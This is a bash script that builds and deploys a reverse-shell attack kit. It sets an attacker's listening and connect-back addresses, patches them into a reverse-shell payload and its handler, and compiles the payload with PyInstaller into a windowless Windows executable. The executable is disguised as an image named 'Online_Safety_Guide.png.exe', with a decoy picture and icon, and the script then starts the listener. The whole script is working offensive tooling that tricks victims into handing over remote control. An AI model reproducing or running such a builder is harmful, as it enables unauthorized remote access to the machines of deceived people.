#!/bin/bash

# !!! RUN THE SCRIPT AS ROOT !!!

handler=Scripts/server.py
rev_sh=Scripts/reverse_shell.py

#====================================================================================================================================================
# GETTING USER INPUT FOR LISTENING HOST AND PORT ADDRESSES		-		CAN BE LEFT EMPTY FOR ATTACKS WITHIN THE LAN
#====================================================================================================================================================

echo "------------------------"
echo "| SERVER CONFIGURATION |"
echo "------------------------"
echo
echo "[*] You can leave the following fields empty if carrying out attacks within the LAN."
echo "[*] The script will assign the default [IP:Port] values to listen and connect back to."
echo
read -p "Enter the IP address of the Listening machine : " listen_ip

if [ -z "$listen_ip" ]
then
	IP_List=$(hostname -I)
	End=`expr index "$IP_List" " "`
	listen_ip=${IP_List:0:End-1}
	echo "[!] No IP address provided. Using identified system IP "$listen_ip
else
	echo "[+] Using Listening IP "$listen_ip
fi


echo
read -p "Enter the Port # to listen on (default is 54321): " listen_port

# if user has not entered a port to listen, default port 54321 will be used
if [ -z "$listen_port" ]
then
	listen_port=54321
	echo "[!] No port provided. Using default port "$listen_port" as Listening Port"
else
	echo "[+] Using "$listen_port" as Listening port"
fi
echo
echo

#====================================================================================================================================================
# GETTING USER INPUT FOR CONNECT BACK HOST AND PORT ADDRESSES		-		CAN BE LEFT EMPTY FOR ATTACKS WITHIN THE LAN [RECOMMENDED]
#====================================================================================================================================================

echo "------------------------"
echo "| CLIENT CONFIGURATION |"
echo "------------------------"
echo
echo "[*] You can leave the following fields empty if carrying out attacks within the LAN."
echo "[*] For over the network attacks, YOU MUST SPECIFY proper address and port number"
echo "for the payload to connect back to."
echo
read -p "Enter the IP address to connect back to : " connect_ip

if [ -z "$connect_ip" ]
then
	connect_ip=$listen_ip
	echo "[!] No IP address provided. Using Connecting Address as "$connect_ip
	echo "[*] Attack can not be carried out over the internet" 
	echo "and is confined only within the LAN of the attacker!"
else
	echo "[+] Using Connecting Address "$connect_ip
fi

echo
read -p "Enter the Port # to connect to (default is 54321): " connect_port

# if user has not entered a port to listen, default port 54321 will be used
if [ -z "$connect_port" ]
then
	connect_port=54321
	echo "[!] No port provided. Using default port "$connect_port" as Connecting Port"
else
	echo "[+] Using "$connect_port" as Connecting port"
fi


#====================================================================================================================================================
# SETTING ALL THE PARAMETERS INTO THE ORIGINAL SCRIPTS
#====================================================================================================================================================


sed -i 's/attack_ip = .*/attack_ip = '\"$listen_ip\"'/' $handler
sed -i 's/connect_ip = .*/connect_ip = '\"$connect_ip\"'/' $rev_sh

sed -i 's/listen_port = .*/listen_port = '$listen_port'/' $handler
sed -i 's/conn_port = .*/conn_port = '$connect_port'/' $rev_sh



wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/home/voldemort/Desktop/pythonScripts/Reverse_Shell/Res/Online_Safety_Guide.png;." --onefile --noconsole --icon /home/voldemort/Desktop/pythonScripts/Reverse_Shell/Res/Icons/img.ico -n Online_Safety_Guide.png Scripts/reverse_shell.py

cp dist/Online_Safety_Guide.png.exe Online_Safety_Guide.png.exe
rm -r dist/ build/ Online_Safety_Guide.png.spec
echo "[+] Generated payload saved at : "$(pwd)

read -p "Press Y when you're ready to launch the handler..." resp
if [ $resp == 'y' ] || [ $resp == 'Y' ]
then
	clear
	sudo -u $(users) python $handler
else
	echo "Exiting the program."
	exit 1
fi
